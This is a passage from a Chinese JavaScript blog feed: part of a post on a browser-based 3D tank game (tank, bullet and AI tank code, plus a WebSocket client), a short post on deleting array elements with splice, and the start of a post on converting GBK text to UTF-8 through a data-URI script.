class="number">0.4</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> ang = Math.PI * <span class="number">2</span> * Math.random();</span><br><span class="line">            rTank.move.call(rTank, ang);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">1200</span>);</span><br><span class="line">    tanks[randomTank] = rTank;</span><br><span class="line">    randomTank++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function run_debug()&#123;</span><br><span class="line">    tanks[<span class="number">0</span>] = new Tank(&#123;cx: <span class="number">50</span>, cy: <span class="number">220</span>, color:<span class="string">&quot;red&quot;</span>, bColor:<span class="string">&quot;red&quot;</span>&#125;);</span><br><span class="line">    tanks[<span class="number">0</span>].<span class="keyword">init</span>(<span class="string">&#x27;0&#x27;</span>, &#123;</span><br><span class="line">        keySet:debug_keySet[<span class="number">0</span>]</span><br><span class="line">    &#125;);</span><br><span class="line">    tanks[<span class="number">1</span>] = new Tank();</span><br><span class="line">    tanks[<span class="number">1</span>].<span class="keyword">init</span>(<span class="string">&#x27;1&#x27;</span>, &#123;</span><br><span class="line">        keySet:debug_keySet[<span class="number">1</span>]</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    createRandomTank(&#123;cx: <span class="number">250</span>, cy: <span class="number">220</span>, color:<span class="string">&quot;#ECFF0B&quot;</span>, bColor:<span class="string">&quot;#ECFF0B&quot;</span>, speed: <span class="number">1</span>, container: backF&#125;);</span><br><span class="line">    createRandomTank(&#123;cx: <span class="number">220</span>, cy: <span class="number">220</span>, color:<span class="string">&quot;#ECFF0B&quot;</span>, bColor:<span class="string">&quot;#ECFF0B&quot;</span>, speed: <span class="number">1</span>, container: backF&#125;);</span><br><span class="line">    createRandomTank(&#123;cx: <span class="number">190</span>, cy: <span class="number">220</span>, color:<span class="string">&quot;#ECFF0B&quot;</span>, bColor:<span class="string">&quot;#ECFF0B&quot;</span>, speed: <span class="number">1</span>, container: backF&#125;);</span><br><span class="line">    createRandomTank(&#123;cx: <span class="number">160</span>, cy: <span class="number">220</span>, color:<span class="string">&quot;#ECFF0B&quot;</span>, bColor:<span class="string">&quot;#ECFF0B&quot;</span>, speed: <span class="number">1</span>, container: backF&#125;);</span><br><span class="line">    createRandomTank(&#123;cx: <span class="number">130</span>, cy: <span class="number">220</span>, color:<span class="string">&quot;#ECFF0B&quot;</span>, bColor:<span class="string">&quot;#ECFF0B&quot;</span>, speed: <span class="number">1</span>, container: backF&#125;);</span><br><span class="line">    createRandomTank(&#123;cx: <span class="number">100</span>, cy: <span class="number">220</span>, color:<span class="string">&quot;#ECFF0B&quot;</span>, bColor:<span class="string">&quot;#ECFF0B&quot;</span>, speed: <span class="number">1</span>, container: backF&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">window.onload = function()&#123;</span></span><br><span class="line"><span class="comment">    var layer = document.createElement(&quot;div&quot;);</span></span><br><span class="line"><span class="comment">    layer.setAttribute(&quot;id&quot;, &quot;layer&quot;);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    var stripe = document.createElement(&quot;div&quot;);</span></span><br><span class="line"><span class="comment">    stripe.setAttribute(&quot;id&quot;, &quot;stripe&quot;);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    stripe.style.top = (document.clientHeight - 250) / 2 + &quot;px&quot;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    document.body.appendChild(layer);</span></span><br><span class="line"><span class="comment">    document.body.appendChild(stripe);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line">$(<span class="string">&quot;#gradeA&quot;</span>)[<span class="number">0</span>].innerHTML = $(<span class="string">&quot;#gradeB&quot;</span>)[<span class="number">0</span>].innerHTML = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//run_debug();</span></span><br><span class="line"></span><br><span class="line">function showMsg(msgContent)&#123;</span><br><span class="line">    <span class="keyword">var</span> box = document.createElement(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> msg = document.createElement(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">    box.setAttribute(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;showMsgBox&quot;</span>);</span><br><span class="line">    msg.setAttribute(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;msgBox&quot;</span>);</span><br><span class="line">    with(box.style)&#123;</span><br><span class="line">        position = <span class="string">&quot;absolute&quot;</span>;</span><br><span class="line">        top = <span class="number">0</span>;</span><br><span class="line">        left = <span class="number">0</span>;</span><br><span class="line">        bottom = <span class="number">0</span>;</span><br><span class="line">        right = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    with(msg.style)&#123;</span><br><span class="line">        margin = <span class="string">&quot;0 auto&quot;</span>;</span><br><span class="line">        width = <span class="string">&quot;500px&quot;</span>;</span><br><span class="line">        height = <span class="string">&quot;400px&quot;</span>;</span><br><span class="line">        marginTop = <span class="string">&quot;100px&quot;</span>;</span><br><span class="line">        padding = <span class="string">&quot;55px&quot;</span>;</span><br><span class="line">        fontSize = <span class="string">&quot;30px&quot;</span>;</span><br><span class="line">        fontFamily = <span class="string">&quot;微软雅黑&quot;</span>;</span><br><span class="line">        lineHeight = <span class="string">&quot;40px&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    msg.innerHTML = msgContent || <span class="string">&quot;空&quot;</span>;</span><br><span class="line">    box.appendChild(msg);</span><br><span class="line">    document.body.appendChild(box);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">showMsg(<span class="string">&quot;&lt;b&gt;[测试版本]&lt;/b&gt;本版本只实现了一半的功能，最终版本是手机控制，并且有音效、登录验证、坦克可以360&amp;deg;旋转，因为需要配置环境，没有公开。左右边界可以穿过，为3D效果。5枪可以搞定一个坦克。&quot;</span> +</span><br><span class="line"><span class="string">&quot;&lt;p&gt;按键 ctrl+alt+J 开始&lt;/p&gt;&lt;p&gt;①：WSAD 控制上下左右，J发子弹&lt;/p&gt;&lt;p&gt;②：↑↓←→ 控制上下左右，p发子弹&lt;/p&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">window.onkeydown = function()&#123;</span><br><span class="line">    <span class="keyword">if</span>(event.ctrlKey &amp;&amp; event.altKey &amp;&amp; event.keyCode == <span class="number">74</span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;#showMsgBox&quot;</span>)[<span class="number">0</span>].style.display = <span class="string">&quot;none&quot;</span>;</span><br><span class="line">        $(<span class="string">&quot;#msgBox&quot;</span>)[<span class="number">0</span>].style.display = <span class="string">&quot;none&quot;</span>;</span><br><span class="line">        run_debug();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">3D</span> Tank JavaScript</span><br></pre></td></tr></table></figure><p>&lt;&#x2F;&#x3D;&gt;&lt;&#x2F;&#x3D;&gt;&lt;&#x2F;&#x3D;&gt;&lt;&#x2F;&#x3D;&gt;&lt;&#x2F;&#x3D;&gt;</p><p>拆开分析下：</p><p>　　<strong>① Tank对象</strong></p><p>DIY坦克（还行，哈哈哈~）：</p><p><img src="https://images.cnitblog.com/blog/387325/201306/04000220-9eec8435edc64f18a644e960407fc644.png" alt=""></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Tank</span> = <span class="keyword">function</span>(<span class="params">setting</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> opts = setting || &#123;&#125;;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">container</span> = opts.<span class="property">container</span> || forwardF;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">dataset</span>   = <span class="variable language_">this</span>.<span class="property">container</span>.<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-num&#x27;</span>).<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">       <span class="comment">//....</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Tank</span>.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">    <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">tankId, debug</span>)&#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(debug)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">debug</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">keySet</span> = debug.<span class="property">keySet</span>;</span><br><span class="line">            <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;keydown&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                this_.<span class="title function_">move_debug</span>();</span><br><span class="line">            &#125;, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="variable language_">this</span>.<span class="property">stopN</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="built_in">clearInterval</span>(this_.<span class="property">timer</span>);</span><br><span class="line">        &#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">paintTank</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">       <span class="comment">//....</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">switchPainter</span>: <span class="keyword">function</span>(<span class="params">N</span>)&#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">direction_debug</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">move_debug</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">ani</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">stopAni</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> event = <span class="variable language_">document</span>.<span class="title function_">createEvent</span>(<span class="string">&#x27;HTMLEvents&#x27;</span>);</span><br><span class="line">        event.<span class="title function_">initEvent</span>(<span class="variable language_">this</span>.<span class="property">stopN</span>, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">    　　event.<span class="property">eventName</span> = <span class="variable language_">this</span>.<span class="property">stopN</span>;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="title function_">dispatchEvent</span>(event);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">detective</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">detectiveTank</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//....</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">shooter</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">       <span class="comment">//....</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">destroy</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">       <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　</p><p>　　难点在于一些边界的判断，但是好好考虑下也不算什么难点咯~这些代码中应该看到了很多debug之类的变量和函数，因为我写了两种模式，一种是手机端玩，一中是电脑键盘控制（debug模式）。</p><p><strong>　　②子弹对象</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@Bullet</span> <span class="variable">Tank</span></span></span><br><span class="line"><span class="comment">* <span class="doctag">@attrs</span> bullet, timer, gap, x, yadsjsw</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Bullet</span> = <span class="keyword">function</span>(<span class="params">gA, x, y, tankId</span>)&#123;</span><br><span class="line">           <span class="comment">//....</span></span><br><span class="line">&#125;;<span class="title class_">Bullet</span>.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">    <span class="attr">move</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">         <span class="comment">//....</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">checkHit</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">         <span class="comment">//....</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">hit</span>: <span class="keyword">function</span>(<span class="params">tTank</span>)&#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">destroy</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">timer</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> tanks[<span class="variable language_">this</span>.<span class="property">tankId</span>] != <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> tankArr = tanks[<span class="variable language_">this</span>.<span class="property">tankId</span>].<span class="property">bulletBox</span>;</span><br><span class="line">            tankArr.<span class="title function_">splice</span>(tankArr.<span class="title function_">indexOf</span>(<span class="variable language_">this</span>),<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">bullet</span>.<span class="property">parentNode</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">bullet</span>.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(<span class="variable language_">this</span>.<span class="property">bullet</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;　　和坦克一样，都有一个destroy函数，销毁对象。</p><p><strong>　　③ 构建AI对象</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createRandomTank</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> obj = obj || &#123;<span class="attr">cx</span>: <span class="number">150</span>, <span class="attr">cy</span>: <span class="number">150</span>, <span class="attr">color</span>:<span class="string">&quot;#ECFF0B&quot;</span>, <span class="attr">bColor</span>:<span class="string">&quot;#ECFF0B&quot;</span>, <span class="attr">speed</span>: <span class="number">1</span>, <span class="attr">container</span>: backF&#125;;</span><br><span class="line">    <span class="keyword">var</span> rTank = <span class="keyword">new</span> <span class="title class_">Tank</span>(obj);</span><br><span class="line">    rTank.<span class="title function_">init</span>(<span class="title class_">String</span>(randomTank));</span><br><span class="line">    rTank.<span class="property">shooterTimer</span> = <span class="literal">null</span>;</span><br><span class="line">    rTank.<span class="property">shooterTimer</span> = <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() &gt; <span class="number">0.8</span>)&#123;</span><br><span class="line">            rTank.<span class="title function_">shooter</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">    rTank.<span class="property">moveTimer</span> = <span class="literal">null</span>;</span><br><span class="line">    rTank.<span class="property">moveTimer</span> = <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() &gt; <span class="number">0.4</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> ang = <span class="title class_">Math</span>.<span class="property">PI</span> * <span class="number">2</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>();</span><br><span class="line">            rTank.<span class="property">move</span>.<span class="title function_">call</span>(rTank, ang);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">1200</span>);</span><br><span class="line">    tanks[randomTank] = rTank;</span><br><span class="line">    randomTank++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　机器人是个麻烦的东西，这块虽然不难，销毁他们的时候费了不少力气~~~主要是那么timer要跟着一起销毁。</p><p><strong>　　④ 构建对象说明</strong></p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">tanks<span class="literal">[<span class="number">0</span>]</span> = <span class="keyword">new</span> <span class="constructor">Tank(&#123;<span class="params">cx</span>: 50, <span class="params">cy</span>: 220, <span class="params">color</span>:<span class="string">&quot;red&quot;</span>, <span class="params">bColor</span>:<span class="string">&quot;red&quot;</span>&#125;)</span>;</span><br><span class="line">tanks<span class="literal">[<span class="number">0</span>]</span>.init(<span class="character">&#x27;0&#x27;</span>, &#123;</span><br><span class="line">    keySet:debug_keySet<span class="literal">[<span class="number">0</span>]</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　这里需要说明一下，只要init后面加了第二个参数，就是调试模式，也就是说键盘是可以控制运行的。</p><p>　　设置了一个全局变量</p><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">                //a   w   d  s   j      ←   ↑   →  ↓   p</span><br><span class="line">debug_keySet = <span class="string">[[65, 87, 68, 83, 74], [37, 38, 39, 40, 80]]</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>3. socket这块</strong></p><p>　　整个平台信息的交互就是以他为核心，socket这个东西还算比较新，所以学习的时候也没找到太多的资料，只能对着w3c的一些文档边试边做。</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">var socket;</span><br><span class="line"><span class="keyword">function</span> ws<span class="constructor">_init()</span> &#123;</span><br><span class="line">    var host = <span class="string">&quot;ws://192.168.86.1:1111/&quot;</span>;</span><br><span class="line">    <span class="comment">// var host = &quot;ws://202.114.20.79:1111/&quot;;</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        socket = <span class="keyword">new</span> <span class="constructor">WebSocket(<span class="params">host</span>)</span>;</span><br><span class="line">        log<span class="constructor">Msg(&#x27;WebSocket - <span class="params">status</span> &#x27;+<span class="params">socket</span>.<span class="params">readyState</span>)</span>;</span><br><span class="line">        socket.onopen    = <span class="keyword">function</span>(msg) &#123; log<span class="constructor">Msg(<span class="string">&quot;Welcome - status &quot;</span>+<span class="params">this</span>.<span class="params">readyState</span>)</span>; send(&#x27;display&#x27;); &#125;;</span><br><span class="line">        socket.onclose   = <span class="keyword">function</span>(msg) &#123; log<span class="constructor">Msg(<span class="string">&quot;Disconnected - status &quot;</span>+<span class="params">this</span>.<span class="params">readyState</span>)</span>; &#125;;</span><br><span class="line">        socket.onmessage = <span class="keyword">function</span>(msg) &#123; <span class="comment">//.... &#125;;</span></span><br><span class="line">    &#125; catch(ex) &#123;</span><br><span class="line">        log<span class="constructor">Msg(<span class="params">ex</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> send(msg) &#123;</span><br><span class="line">    <span class="keyword">try</span>　&#123;</span><br><span class="line">        socket.send(msg + <span class="character">&#x27;=&#x27;</span>);</span><br><span class="line">    &#125; catch(ex) &#123;</span><br><span class="line">        log<span class="constructor">Msg(<span class="params">ex</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　socket在前端部分是非常简单的，就是三个事件onopen, onclose, onmessage来驱动，重点还是后台操作，真心麻烦！</p><h3><strong>后台部分</strong></h3><p>后台用的是php，本来打算使用nodeJS，不是十分熟练，24个小时的赛制花太长时间去学习也不现实，所以就用了比较熟悉的php来建立socket连接，还算成功吧。</p><p>这个部分以后有时间说。先碎觉~~</p><p>最后，别忘了这个DEMO哦，&nbsp;<a title="3D tank" href="http://qianduannotes.sinaapp.com/3dtank/html/index.html" target="_blank">http://qianduannotes.sinaapp.com/3dtank/html/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>删除数组中的某个元素</title>
      <link href="/blog/2013/05/31/cb-splice-in-array/"/>
      <url>/blog/2013/05/31/cb-splice-in-array/</url>
      
        <content type="html"><![CDATA[<p>在之前的<a title="Javascript综合应用小案例（续）" href="http://www.cnblogs.com/hustskyking/archive/2013/05/05/getKeywords-2.html" target="_blank">文章</a>中也介绍过类似的东西，主要操作的方式是利用splice这个便利函数。</p><p>我们要删除，Arr数组中的元素b，具体做法是：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">//第一步是获取b在Arr中的位置</span></span><br><span class="line">var index = <span class="module-access"><span class="module"><span class="identifier">Arr</span>.</span></span>index<span class="constructor">Of(<span class="params">b</span>)</span>;</span><br><span class="line"><span class="comment">//第二步就是利用splice删除该元素</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Arr</span>.</span></span>splice(b, <span class="number">1</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单点写就是：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Arr</span>.</span></span>splice(<span class="module-access"><span class="module"><span class="identifier">Arr</span>.</span></span>index<span class="constructor">Of(<span class="params">b</span>)</span>, <span class="number">1</span>); <span class="comment">//这里的b可以是任意对象</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><em>注：并非所有浏览器都支持indexOf这个函数，可能你需要自己写一个遍历函数获取到需要查询元素b的索引值。</em></p><p>下面是我随便写的一个Array对象的扩展：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">index</span> = <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = <span class="variable language_">this</span>.<span class="property">length</span>; i &lt; len; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>[i] === obj) <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">del</span> = <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">splice</span>(<span class="variable language_">this</span>.<span class="title function_">indexOf</span>(obj), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试地址：<a title="DEMO" href="http://qianduannotes.sinaapp.com/test/splice/index.html" target="_blank">DEMO</a></p><p>&nbsp;. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; . &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; . &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; . &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;.</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> splice </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用javascript进行编码转换，GBK转UTF-8</title>
      <link href="/blog/2013/05/30/cb-gbk-to-utf8-via-javascript/"/>
      <url>/blog/2013/05/30/cb-gbk-to-utf8-via-javascript/</url>
      
        <content type="html"><![CDATA[<p>DEMO：</p><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="language-xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> script=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">script.<span class="property">src</span>=<span class="string">&#x27;data:text/javascript;charset=gbk,(function()</span></span></span><span class="language-xquery">&#123;    <span class="keyword">window</span>.b=<span class="string">&quot;%c4%e3%ba%c3&quot;</span>;   <span class="built_in"> document</span>.getElementById(<span class="string">&quot;a&quot;</span>).innerHTML = <span class="keyword">window</span>.b;&#125;</span><span class="language-xml">)()&#x27;;</span></span><br><span class="line"><span class="language-xml">document.body.appendChild(script);</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure><p>群里交流，大牛们提出来的方案（薛端阳）。</p><p>这种方式比较奇葩，但相当便捷。 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 